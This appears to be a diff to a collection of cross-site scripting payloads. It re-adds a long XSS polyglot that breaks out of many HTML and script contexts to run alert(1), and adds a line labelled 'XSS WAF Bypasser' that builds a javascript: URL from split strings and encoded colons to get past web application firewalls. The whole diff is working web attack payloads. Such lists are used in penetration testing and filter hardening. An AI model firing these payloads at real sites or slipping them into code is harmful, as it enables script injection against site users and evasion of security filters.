@@ -1,1 +1,2 @@
- JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
+JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
+//XSS WAF Bypasser//: d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b
